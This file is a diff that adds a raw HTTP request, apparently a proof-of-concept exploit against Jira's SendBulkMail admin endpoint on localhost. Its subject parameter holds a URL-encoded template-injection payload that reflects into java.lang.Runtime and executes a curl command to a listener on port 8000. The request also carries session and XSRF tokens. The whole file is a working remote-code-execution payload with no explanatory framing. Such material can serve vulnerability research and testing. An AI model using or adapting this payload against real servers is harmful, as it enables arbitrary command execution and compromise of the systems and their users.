@@ -1,0 +1,15 @@
+POST /secure/admin/SendBulkMail.jspa HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/secure/admin/test!default.jspa
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 395
+DNT: 1
+Connection: close
+Cookie: atlassian.xsrf.token=BKE3-2JP7-HJOD-JC6G|45a96bd91f82e20f748302e88176351bc75d3692|lin; JSESSIONID=23F640B7A4F5CD1988C7B5FFB5604023
+Upgrade-Insecure-Requests: 1
+
+sendToRoles=true&projects=10000&roles=10002&replyTo=&subject=%24i18n.getClass%28%29.forName%28%27java.lang.Runtime%27%29.getMethod%28%27getRuntime%27%2Cnull%29.invoke%28null%2Cnull%29.exec%28%27curl+127.0.0.1%3A8000%2F%2FPoC%2F%2F%27%29.waitFor%28%29&message=bodytest&messageType=html&sendBlind=true&Send=Send&atl_token=BKE3-2JP7-HJOD-JC6G%7C45a96bd91f82e20f748302e88176351bc75d3692%7Clin
